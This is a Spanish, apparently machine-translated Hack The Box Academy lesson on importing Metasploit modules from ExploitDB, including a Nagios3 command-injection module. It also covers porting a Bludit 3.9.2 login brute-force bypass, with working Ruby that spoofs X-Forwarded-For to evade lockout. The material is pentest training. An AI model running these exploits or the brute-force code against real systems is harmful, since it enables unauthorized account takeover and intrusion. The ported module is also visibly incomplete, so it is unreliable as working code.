# Escribir e importar módulos

Para instalar cualquier nuevo módulo de metasploit que ya hayan sido portados por otros usuarios, uno puede optar por actualizar su`msfconsole`Desde el terminal, que garantizará que todas las exploits más recientes, auxiliares y características se instalen en la última versión de`msfconsole`. Mientras los módulos portados se hayan empujado a la rama principal de trabajo de metasploit en GitHub, debemos actualizarse con los últimos módulos.

Sin embargo, si solo necesitamos un módulo específico y no queremos realizar una actualización completa, podemos descargar ese módulo e instalarlo manualmente. Nos centraremos en buscar a ExploitDB para los módulos de metasploit fácilmente disponibles, que podemos importar directamente a nuestra versión de`msfconsole`en la zona.

[Explotador](https://www.exploit-db.com/)es una gran opción al buscar una exploit personalizada. Podemos usar etiquetas para buscar a través de los diferentes escenarios de explotación para cada script disponible. Una de estas etiquetas es[Marco de metasploit (MSF)](https://www.exploit-db.com/?tag=3), que, si se selecciona, mostrará solo scripts que también están disponibles en formato del módulo MetaSploit. Estos se pueden descargar directamente de ExploitDB e instalarse en nuestro directorio de marco de metasploit local, desde donde se pueden buscar y llamar desde el interior del`msfconsole`.

![](https://academy.hackthebox.com/storage/modules/39/exploit-db.png)

Digamos que queremos usar un exploit encontrado para`Nagios3`, que aprovechará una vulnerabilidad de inyección de comando. El módulo que estamos buscando es`Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)`. Entonces encendemos`msfconsole`e intente buscar esa exploit específica, pero no podemos encontrarlo. Esto significa que nuestro marco de metasploit no está actualizado o que el específico`Nagios3`El módulo de explotación que estamos buscando no está en la versión oficial actualizada del marco MetaSploit.

### **MSF - Buscar exploits**

Escribir e importar módulos

```
msf6 > search nagios

Matching Modules
================

#  Name                                                          Disclosure Date  Rank       Check  Description   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration

```

Sin embargo, podemos encontrar el código de exploit[Entradas de ExploitDB](https://www.exploit-db.com/exploits/9861). Alternativamente, si no queremos usar nuestro navegador web para buscar un exploit específico dentro de ExploitDB, podemos usar la versión CLI,`searchsploit`.

Escribir e importar módulos

```
xnoxos@htb[/htb]$ searchsploit nagios3--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Tenga en cuenta que las terminaciones de archivo alojadas que terminan en`.rb`son guiones de rubí que probablemente se han creado específicamente para su uso dentro de`msfconsole`. También podemos filtrar solo por`.rb`terminaciones de archivo para evitar la salida de los scripts que no pueden ejecutarse dentro de`msfconsole`. Tenga en cuenta que no todos`.rb`Los archivos se convierten automáticamente en`msfconsole`módulos. Algunos exploits se escriben en Ruby sin tener ningún código compatible con el módulo MetaSploit en ellas. Veremos uno de estos ejemplos en la siguiente subsección.

Escribir e importar módulos

```
xnoxos@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Tenemos que descargar el`.rb`archivo y colóquelo en el directorio correcto. El directorio predeterminado donde todos los módulos, scripts, complementos y`msfconsole`Los archivos propietarios se almacenan es`/usr/share/metasploit-framework`. Las carpetas críticas también están simuladas en nuestra casa y carpetas de raíz en el escondido`~/.msf4/`ubicación.

### **MSF - Estructura del directorio**

Escribir e importar módulos

```
xnoxos@htb[/htb]$ ls /usr/share/metasploit-framework/app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools

```

Escribir e importar módulos

```
xnoxos@htb[/htb]$ ls .msf4/history  local  logos  logs  loot  modules  plugins  store

```

Lo copiamos en el directorio apropiado después de descargar el[explotar](https://www.exploit-db.com/exploits/9861). Tenga en cuenta que nuestra carpeta de inicio`.msf4`La ubicación puede no tener toda la estructura de carpetas que`/usr/share/metasploit-framework/`Uno podría tener. Entonces, solo necesitaremos`mkdir`las carpetas apropiadas para que la estructura sea la misma que la carpeta original para que`msfconsole`puede encontrar los nuevos módulos. Después de eso, procederemos a copiar el`.rb`Script directamente en la ubicación primaria.

Tenga en cuenta que hay ciertas convenciones de nombres que, si no se respetan adecuadamente, generarán errores al intentar obtener`msfconsole`Para reconocer el nuevo módulo que instalamos. Siempre use los personajes alfanuméricos y de caso de serpiente y los subrayadores en lugar de los guiones.

Por ejemplo:

- `nagios3_command_injection.rb`
- `our_module_here.rb`

### **MSF - Carga de módulos adicionales en tiempo de ejecución**

Escribir e importar módulos

```
xnoxos@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rbxnoxos@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

### **MSF - Carga de módulos adicionales**

Escribir e importar módulos

```
msf6> loadpath /usr/share/metasploit-framework/modules/

```

Alternativamente, también podemos lanzarnos`msfconsole`y corre el`reload_all`Comando para que el módulo recién instalado aparezca en la lista. Después de ejecutar el comando y no se informan errores, pruebe el`search [name]`función dentro`msfconsole`o directamente con el`use [module-path]`para saltar directamente al módulo recién instalado.

Escribir e importar módulos

```
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection
msf6 exploit(unix/webapp/nagios3_command_injection) > show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   ----     ---------------                 --------  -----------
   PASS     guest                           yes       The password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                              yes       The target port (TCP)
   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
   USER     guest                           yes       The username to authenticate with
   VHOST                                    no        HTTP server virtual host

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

Ahora estamos listos para lanzarlo contra nuestro objetivo.

---

# **Portarse sobre los scripts en módulos de metasploit**

Para adaptar un Python personalizado, PHP o cualquier tipo de script de exploit a un módulo Ruby para Metasploit, necesitaremos aprender el lenguaje de programación de Ruby. Tenga en cuenta que los módulos Ruby para Metasploit siempre se escriben con pestañas duras.

Al comenzar con un proyecto de puerto, no necesitamos comenzar a codificar desde cero. En cambio, podemos tomar uno de los módulos de exploit existentes de la categoría que nuestro proyecto se ajusta y reutilizarlo para nuestro script actual de puerto. Tenga en cuenta que siempre mantenga nuestros módulos personalizados organizados para que nosotros y otros probadores de penetración puedan beneficiarse de un entorno limpio y organizado al buscar módulos personalizados.

Comenzamos eligiendo un código de exploit para puerto a MetaSploit. En este ejemplo, iremos por[Bludit 3.9.2 - Autenticación Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746). Tendremos que descargar el script,`48746.rb`y proceda a copiarlo en el`/usr/share/metasploit-framework/modules/exploits/linux/http/`carpeta. Si arrancamos en`msfconsole`En este momento, solo podremos encontrar un solo`Bludit CMS`Explotar en la misma carpeta que se indicó anteriormente, confirmando que nuestro exploit no se ha portado todavía. Es una buena noticia que ya hay una exploit de bludit en esa carpeta porque la usaremos como código de Boilerplate para nuestro nuevo exploit.

### **Porting módulos MSF**

Escribir e importar módulos

```
xnoxos@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bluditbludit_upload_images_exec.rb

```

Escribir e importar módulos

```
xnoxos@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

Al comienzo del archivo que copiamos, que es donde completaremos nuestra información, podemos notar el`include`Declaraciones al comienzo del módulo Boilerplate. Estas son las mezclas mencionadas en el`Plugins and Mixins`sección, y tendremos que cambiarlos a los apropiados para nuestro módulo.

Si queremos encontrar las mezclas, clases y métodos requeridos para que nuestro módulo funcione, necesitaremos buscar las diferentes entradas en el[Documentación RubyDoc Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf).

---

# **Escribiendo nuestro módulo**

A menudo enfrentaremos una red personalizada que ejecuta un código de propiedad para atender a sus clientes durante evaluaciones específicas. La mayoría de los módulos que tenemos a mano ni siquiera hacen mella en su perímetro, y parece que no podemos escanear y documentar el objetivo con cualquier cosa que tengamos correctamente. Aquí es donde podríamos encontrar útil desempolvar nuestras habilidades de Ruby y comenzar a codificar nuestros módulos.

Se puede encontrar toda la información necesaria sobre la codificación de rubí de metasploit en el[Rubydoc.info marco de metasploit](https://www.rubydoc.info/github/rapid7/metasploit-framework)página relacionada. Desde escáneres hasta otras herramientas auxiliares, desde exploits de fabricación personalizada hasta portadas, codificar en Ruby para el marco es una habilidad increíblemente aplicable.

Observe a continuación un módulo similar que podemos usar como código Boilerplate para nuestro puerto de exploit. Este es el[Vulnerabilidad de carga de archivo de imagen transversal del directorio de transversal](https://www.exploit-db.com/exploits/47699)Exploit, que ya se ha importado a`msfconsole`. Tómese un momento para reconocer todos los diferentes campos incluidos en el módulo antes de la prueba de concepto de explotación (`POC`). Tenga en cuenta que este código no se ha cambiado en el fragmento a continuación para adaptarse a nuestra importación actual, pero es una instantánea directa del módulo preexistente mencionado anteriormente. La información deberá ajustarse en consecuencia para el nuevo proyecto de puerto.

### **Prueba de concepto-requisitos**

Código:rubí

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report

```

Podemos mirar el`include`declaraciones para ver lo que hace cada uno. Esto se puede hacer mediante la referencia cruzada con el[Documentación RubyDoc Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf). A continuación se presentan sus respectivas funciones como se explica en la documentación:

| **Función** | **Descripción** |
| --- | --- |
| `Msf::Exploit::Remote::HttpClient` | Este módulo proporciona métodos para actuar como un cliente HTTP al explotar un servidor HTTP. |
| `Msf::Exploit::PhpEXE` | Este es un método para generar una carga útil PHP de primera etapa. |
| `Msf::Exploit::FileDropper` | Este método transfiere archivos y maneja la limpieza de archivos después de que se establece una sesión con el objetivo. |
| `Msf::Auxiliary::Report` | Este módulo proporciona métodos para informar datos al MSF DB. |

Mirando sus propósitos anteriores, concluimos que no necesitaremos el método FiledRopper, y podemos soltarlo del código final del módulo.

Vemos que hay diferentes secciones dedicadas a la`info`página del módulo, el`options`sección. Los llenamos adecuadamente, ofreciendo el crédito debido a las personas que descubrieron la exploit, la información de CVE y otros detalles relevantes.

### **Prueba de concepto: información del módulo**

Código:rubí

```ruby
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'christasa', # Original discovery
          'sinn3r'     # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-16113'],
          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))

```

Después de que se completa la información de identificación general, podemos mudarnos al`options`Variables de menú:

### **Prueba de concepto: funciones**

Código:rubí

```ruby
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end

```

Mirando hacia atrás en nuestra exploit, vemos que se requerirá una lista de palabras en lugar de la`BLUDITPASS`Variable para el módulo a la fuerza bruta las contraseñas para el mismo nombre de usuario. Se vería algo así como el siguiente fragmento:

Código:rubí

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])

```

El resto del código de exploit debe ajustarse de acuerdo con las clases, métodos y variables utilizadas en la portada al marco de MetaSploit para que el módulo funcione al final. La versión final del módulo se vería así:

### **Prueba de concepto**

Código:rubí

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))

     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end

  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domainself.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end

```

Si desea obtener más información sobre cómo portamiento de scripts en el marco de MetaSploit, consulte el[MetaSploit: una guía de probador de penetración de No Starch Press](https://nostarch.com/metasploit). Rapid7 también ha creado publicaciones de blog sobre este tema, que se pueden encontrar[aquí](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).

[Anterior](https://academy.hackthebox.com/module/39/section/414)